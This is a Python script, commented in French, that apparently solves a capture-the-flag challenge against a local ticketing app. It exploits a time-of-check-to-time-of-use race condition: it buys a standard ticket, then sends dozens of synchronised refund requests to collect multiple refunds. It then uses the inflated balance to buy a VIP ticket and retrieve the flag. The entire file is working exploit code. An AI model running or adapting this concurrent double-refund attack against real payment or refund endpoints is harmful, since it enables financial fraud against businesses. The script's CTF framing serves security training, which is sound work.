#!/usr/bin/env python3
"""CyberNight Race Condition - test local de remboursements concurrents."""
import argparse
import json
import threading
import urllib.error
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from http.cookiejar import CookieJar


def send(url, path, *, data=None, cookie=None, opener=None, timeout=12):
    headers = {"Accept": "application/json"}
    if cookie:
        headers["Cookie"] = cookie
    if data is not None:
        headers["Content-Type"] = "application/json"
        payload = json.dumps(data).encode("utf-8")
    else:
        payload = None
    req = urllib.request.Request(
        url.rstrip("/") + path, data=payload, headers=headers,
        method="POST" if data is not None else "GET"
    )
    try:
        resp = opener.open(req, timeout=timeout) if opener else urllib.request.urlopen(req, timeout=timeout)
    except urllib.error.HTTPError as exc:
        resp = exc
    with resp:
        raw = resp.read().decode("utf-8", errors="replace")
        try:
            body = json.loads(raw)
        except json.JSONDecodeError:
            body = {"message": raw[:200]}
        return resp.status, body


def main():
    p = argparse.ArgumentParser(description="Test TOCTOU sur la billetterie CyberNight")
    p.add_argument("url", nargs="?", default="http://127.0.0.1:8080")
    p.add_argument("--workers", type=int, default=30)
    p.add_argument("--rounds", type=int, default=5)
    args = p.parse_args()
    if not (2 <= args.workers <= 120 and 1 <= args.rounds <= 20):
        p.error("--workers doit être entre 2 et 120 ; --rounds entre 1 et 20")

    jar = CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
    status, wallet = send(args.url, "/api/wallet", opener=opener)
    if status != 200:
        raise SystemExit(f"Impossible d'initialiser la session : HTTP {status} {wallet}")
    cookie = "; ".join(f"{c.name}={c.value}" for c in jar)
    if not cookie:
        raise SystemExit("Aucun cookie de session reçu : impossible de partager la session")
    print(f"[*] Solde initial : {wallet['balance']} crédits")

    for rnd in range(1, args.rounds + 1):
        status, wallet = send(args.url, "/api/wallet", cookie=cookie)
        if status != 200:
            raise SystemExit(f"Erreur portefeuille : HTTP {status} {wallet}")
        if wallet["balance"] >= 150:
            break
        status, result = send(args.url, "/api/buy", data={"ticket_type": "standard"}, cookie=cookie)
        if status != 200:
            raise SystemExit(f"Achat Standard impossible : HTTP {status} {result}")
        ticket_id = result["ticket"]["id"]
        print(f"\n[Tour {rnd}] Billet Standard #{ticket_id} acheté (solde {result['balance']})")

        barrier = threading.Barrier(args.workers + 1)
        def worker(_):
            barrier.wait(timeout=15)
            return send(args.url, "/api/refund", data={"ticket_id": ticket_id}, cookie=cookie)

        results = []
        with ThreadPoolExecutor(max_workers=args.workers) as pool:
            futures = [pool.submit(worker, i) for i in range(args.workers)]
            barrier.wait(timeout=15)
            for future in as_completed(futures):
                try:
                    results.append(future.result())
                except Exception as exc:
                    results.append((0, {"message": str(exc)}))
        counts = {}
        for status, _ in results:
            counts[status] = counts.get(status, 0) + 1
        _, wallet = send(args.url, "/api/wallet", cookie=cookie)
        print(f"  Réponses HTTP : {counts}")
        print(f"  Solde final : {wallet['balance']} crédits")
        if counts.get(200, 0) > 1:
            print("  [!] Double remboursement observé : race condition exploitable")
        if wallet["balance"] >= 150:
            break

  
    # ==========================================
    # ACHAT VIP ET RÉCUPÉRATION DU FLAG
    # ==========================================

    if wallet["balance"] >= 150:

        status, result = send(
            args.url,
            "/api/buy",
            data={"ticket_type": "vip"},
            cookie=cookie
        )

        print(f"\n[VIP] HTTP {status} : {result}")

        if status == 200 and result.get("success"):

            print("\n[*] Billet VIP obtenu !")
            print("[*] Récupération de la récompense...")

            reward_status, reward = send(
                args.url,
                "/api/reward",
                cookie=cookie
            )

            if reward_status == 200 and reward.get("success"):

                flag = reward.get("flag")

                print("\n" + "=" * 55)
                print("         CYBERNIGHT 2026 - CHALLENGE SOLVED")
                print("=" * 55)
                print(f"\n[FLAG] {flag}\n")
                print("=" * 55)

            else:
                print(
                    f"[-] Impossible de récupérer le flag : "
                    f"HTTP {reward_status} {reward}"
                )

        else:
            print("[-] L'achat du billet VIP a échoué.")

    else:
        print(
            "\n[-] Aucun double remboursement suffisant "
            "observé pendant ces essais."
        )
        print(
            "    Cela ne prouve ni l'absence ni "
            "la reproductibilité de la faille."
        )


if __name__ == "__main__":
    main()
